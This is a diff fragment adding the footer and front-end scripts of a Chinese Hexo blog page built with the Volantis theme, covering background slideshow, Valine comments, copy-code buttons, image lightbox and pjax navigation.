+          
+        </div>
+      
+    
+      
+        <div><p>博客内容遵循 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
+</div>
+      
+    
+      
+        本站使用
+        <a href="https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0" target="_blank" class="codename">Volantis</a>
+        作为主题，总访问量为
+          <span id="busuanzi_value_site_pv"><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+          次
+        
+      
+    
+      
+        <div class='copyright'>
+        <p><a href="/">Copyright © 2019-2020</a></p>
+
+        </div>
+      
+    
+  </footer>
+
+
+    <a class="s-top fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
+  </div>
+  <div>
+    
+    
+<script src="/static/js-css/jquery.min.js"></script>
+
+
+
+  <script>
+    
+    var SEARCH_SERVICE = "hexo" || "hexo";
+    var ROOT = "/" || "/";
+    if (!ROOT.endsWith('/')) ROOT += '/';
+  </script>
+
+
+
+  <script async src="/static/js-css/instant_page.js" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+
+
+
+  
+  
+  
+    
+<script src="/static/js-css/jquery.backstretch.min.js"></script>
+
+    <script type="text/javascript">
+      $(function(){
+        var imgs=["/static/images/1.jpg", "/static/images/2.jpg", "/static/images/3.jpg", "/static/images/4.jpg", "/static/images/5.jpg", "/static/images/6.jpg", "/static/images/7.jpg", "/static/images/8.jpg", "/static/images/9.jpg", "/static/images/10.jpg", "/static/images/11.jpg", "/static/images/12.jpg", "/static/images/13.jpg", "/static/images/14.jpg", "/static/images/15.jpg", "/static/images/16.jpg", "/static/images/17.jpg", "/static/images/18.jpg", "/static/images/19.jpg", "/static/images/20.jpg", "/static/images/21.jpg", "/static/images/22.jpg", "/static/images/23.jpg", "/static/images/24.jpg", "/static/images/25.jpg", "/static/images/26.jpg", "/static/images/27.jpg", "/static/images/28.jpg", "/static/images/29.jpg", "/static/images/30.jpg", "/static/images/31.jpg", "/static/images/32.jpg", "/static/images/33.jpg", "/static/images/34.jpg", "/static/images/35.jpg", "/static/images/36.jpg", "/static/images/37.jpg", "/static/images/38.jpg", "/static/images/39.jpg", "/static/images/40.jpg", "/static/images/41.jpg", "/static/images/42.jpg", "/static/images/43.jpg", "/static/images/44.jpg", "/static/images/45.jpg", "/static/images/46.jpg", "/static/images/47.jpg", "/static/images/48.jpg", "/static/images/49.jpg", "/static/images/50.jpg", "/static/images/51.jpg", "/static/images/52.jpg", "/static/images/53.jpg", "/static/images/54.jpg", "/static/images/55.jpg", "/static/images/56.jpg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg"];
+        if ('true' == 'true') {
+          function shuffle(arr){
+            /*From countercurrent-time*/
+            var n = arr.length;
+            while(n--) {
+              var index = Math.floor(Math.random() * n);
+              var temp = arr[index];
+              arr[index] = arr[n];
+              arr[n] = temp;
+            }
+          }
+          shuffle(imgs);
+        }
+        if ('.cover') {
+          $('.cover').backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        } else {
+          $.backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        }
+      });
+    </script>
+  
+
+
+
+
+
+
+  
+  
+<script src="/js/valine.js"></script>
+
+
+<script>
+  var GUEST_INFO = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link'.split(',').filter(function (item) {
+    return GUEST_INFO.indexOf(item) > -1
+  });
+  var REQUIRED_FIELDS = ['nick', 'mail', 'link'];
+  var requiredFields = 'nick,mail'.split(',').filter(function (item) {
+    return REQUIRED_FIELDS.indexOf(item) > -1
+  });
+
+  function emoji(path, idx, ext) {
+    return path + "/" + path + "-" + idx + "." + ext;
+  }
+
+  var emojiMaps = {};
+  for (var i = 1; i <= 54; i++) {
+    emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+  }
+  for (var i = 1; i <= 101; i++) {
+    emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+  }
+  for (var i = 1; i <= 116; i++) {
+    emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+  }
+  for (var i = 1; i <= 125; i++) {
+    emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+  }
+  for (var i = 1; i <= 4; i++) {
+    emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+  }
+
+  function pjax_valine() {
+    let pageUrl = $.trim($('#pjax-comment-path').text()) === "none" ? 
+      decodeURI(window.location.pathname) : $.trim($('#pjax-comment-path').text());
+    let pagePlaceholder = $.trim($('#pjax-comment-placeholder').text()) === "none" ?
+      "快来评论吧~" : $.trim($('#pjax-comment-placeholder').text());
+
+    let ALLPATH = '';
+    if(ALLPATH != '') pageUrl = ALLPATH;
+
+    var valine = new Valine();
+    valine.init({
+      el: '#valine_container',
+      meta: meta,
+      placeholder: pagePlaceholder,
+      path: pageUrl,
+      appId: "or2NepulP8NGKXehq1IRSQTc-gzGzoHsz",
+      appKey: "lRlc11XLlqK4AeDJeNJxo17y",
+      pageSize: '10',
+      avatar: 'robohash',
+      lang: 'zh-cn',
+      visitor: 'true',
+      highlight: 'true',
+      mathJax: 'false',
+      enableQQ: 'true',
+      requiredFields: requiredFields,
+      emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+      emojiMaps: emojiMaps
+    })
+  }
+
+  $(function () {
+    pjax_valine();
+  });
+</script>
+
+
+
+
+<!-- darkmodejs -->
+
+
+<!-- 复制 -->
+
+  <script src="/static/js-css/clipboard.min.js"></script>
+<script>
+    var clipboard = new ClipboardJS('.btn-copy', {
+        target: function (trigger) {
+            return trigger.nextElementSibling
+        }
+    });
+    function wait(callback, seconds) {
+        var timelag = null;
+        timelag = window.setTimeout(callback, seconds)
+    }
+    function pjax_initCopyCode() {
+        var copyHtml = '';
+        copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+        copyHtml += '<i class="fas fa-copy"></i><span>COPY</span>';
+        copyHtml += '</button>';
+        $(".highlight .code pre").before(copyHtml);
+        $(".article pre code").before(copyHtml);
+        clipboard.off('success').on('success', function (e) {
+            let $btn = $(e.trigger);
+            $btn.addClass('copied');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-check-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPIED';
+            wait(function () {
+                $icon.removeClass('fa-check-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        });
+        clipboard.off('error').on('error', function (e) {
+            e.clearSelection();
+            let $btn = $(e.trigger);
+            $btn.addClass('copy-failed');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-times-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPY FAILED';
+            wait(function () {
+                $icon.removeClass('fa-times-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        })
+    }
+    $(function () {
+        pjax_initCopyCode()
+    });
+</script>
+
+
+<!-- scrollreveal -->
+
+  <script src="/static/js-css/scrollreveal.min.js"></script>
+  <script type="text/javascript">
+    function pjax_scrollrebeal() {
+      ScrollReveal().reveal('.l_main .reveal', {
+        distance: '32px',
+        duration: '800',
+        interval: '20',
+        scale: '1',
+        easing: 'ease-out'
+      });
+    }
+
+    $(function () {
+      pjax_scrollrebeal();
+    });
+  </script>
+
+<!-- ******************************** -->
+
+<!-- fancybox -->
+<script src="/static/js-css/jquery.fancybox.min.js"></script>
+<script>
+  function pjax_fancybox() {
+    $(".article-entry").find("img").not('.inline').not('a img').each(function () { //渲染 fancybox
+      var element = document.createElement("a"); // a 标签
+      $(element).attr("class", "fancybox");
+      $(element).attr("pjax-fancybox", "");  // 过滤 pjax
+      $(element).attr("href", $(this).attr("src"));
+      if ($(this).attr("data-original")) {
+        $(element).attr("href", $(this).attr("data-original"));
+      }
+      $(element).attr("data-fancybox", "images");
+      var caption = "";   // 描述信息
+      if ($(this).attr('alt')) {  // 判断当前页面是否存在描述信息
+        $(element).attr('data-caption', $(this).attr('alt'));
+        caption = $(this).attr('alt');
+      }
+      var div = document.createElement("div");
+      $(div).addClass("fancybox");
+      $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
+      var span = document.createElement("span");
+      $(span).addClass("image-caption");
+      $(span).text(caption); // 加描述
+      $(this).after(span);  // 再套一层描述
+      $(this).wrap(element);  // 最后套 a 标签
+    })
+    $(".article-entry").find("img").fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+      closeClick: true,
+      helpers: {
+        overlay: {closeClick: true}
+      },
+      buttons: [
+        "zoom",
+        "close"
+      ]
+    });
+  };
+  $(function () {
+    pjax_fancybox();
+  });
+</script>
+
+<!-- ******************************** -->
+
+
+  
+<script src="/js/app.js"></script>
+
+
+
+
+  
+    
+<script src="/js/search.js"></script>
+
+  
+
+
+
+  <script defer src="/static/js-css/busuanzi.pure.mini.js" data-pjax></script>
+
+
+
+  
+<script src="/static/js-css/waves.min.js"></script>
+
+  <script type="text/javascript">
+    $(function () {
+      Waves.attach('.flat-btn', ['waves-button']);
+      Waves.attach('.float-btn', ['waves-button', 'waves-float']);
+      Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
+      Waves.attach('.flat-box', ['waves-block']);
+      Waves.attach('.float-box', ['waves-block', 'waves-float']);
+      Waves.attach('.waves-image');
+      Waves.init();
+    });
+  </script>
+
+
+
+  
+<script src="/static/js-css/comment_typing.js"></script>
+
+
+
+
+
+
+
+    
+      
+
+
+<script src="/static/js-css/pjax.min.js"></script>
+
+<!-- 样式位于：source/css/_third-party/pjaxanimate.styl -->
+
+<div class="pjax-animate">
+  
+    <script src="/static/js-css/nprogress.min.js"></script>
+    <div id="loading-bar-wrapper"><script>NProgress.configure({parent:"#loading-bar-wrapper",trickleSpeed: 100})</script></div>
+    <script>
+      window.ShowLoading = function() {
+        NProgress.start();
+      };
+      window.HideLoading = function() {
+        NProgress.done();
+      }
+    </script>
+  
+</div>
+
+<script>
+    var pjax;
+    document.addEventListener('DOMContentLoaded', function () {
+      pjax = new Pjax({
+        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox])',
+        selectors: [
+          "title",
+          "#pjax-container",
+          "#pjax-header-nav-list"
+        ],
+        cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+        timeout: 5000
+      });
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+      window.stop(); // 相当于点击了浏览器的停止按钮
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      window.subData = null; // 移除标题（用于一二级导航栏切换处）
+      $.fancybox.close();    // 关闭弹窗
+      $('.l_header .switcher .s-search').removeClass('active'); // 关闭移动端激活的搜索框
+      $('.l_header').removeClass('z_search-open'); // 关闭移动端激活的搜索框
+      $('.wrapper').removeClass('sub'); // 跳转页面时关闭二级导航
+
+      // 解绑事件 避免重复监听
+      $('.s-top').unbind('click');
+      $('.menu a').unbind('click');
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+      window.ShowLoading();
+    });
+
+    document.addEventListener('pjax:complete', function () {
+      // 关于百度统计对 SPA 页面的处理：
+      // 方案一：百度统计>管理>单页应用设置中，打开开启按钮即可对SPA进行统计。 https://tongji.baidu.com/web/help/article?id=324
+      // 方案二：取消注释下列代码。 https://tongji.baidu.com/web/help/article?id=235
+      // 
+
+      // 关于谷歌统计对 SPA 页面的处理：
+      // 当应用以动态方式加载内容并更新地址栏中的网址时，也应该更新通过 gtag.js 存储的网页网址。
+      // https://developers.google.cn/analytics/devguides/collection/gtagjs/single-page-applications?hl=zh-cn
+      
+
+      $('.nav-main').find('.list-v').not('.menu-phone').removeAttr("style",""); // 移除小尾巴的移除
+      $('.menu-phone.list-v').removeAttr("style",""); // 移除小尾巴的移除
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+
+      try{
+        pjax_fancybox();
+        
+          
+          if ('.cover') {
+            $('.cover').backstretch("resize");
+          } else {
+            $.backstretch("resize");
+          }
+        
+        
+        
+          pjax_scrollrebeal();
+        
+        
+          pjax_initCopyCode();
+        
+        
+          pjax_valine();
+        
+        
+        
+        
+        
+      } catch (e) {
+        console.log(e);
+      }
+      window.HideLoading();
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      window.HideLoading();
+      window.location.href = e.triggerElement.href;
+    });
+</script>
+
+    
+  </div>
+</body>
+</html>
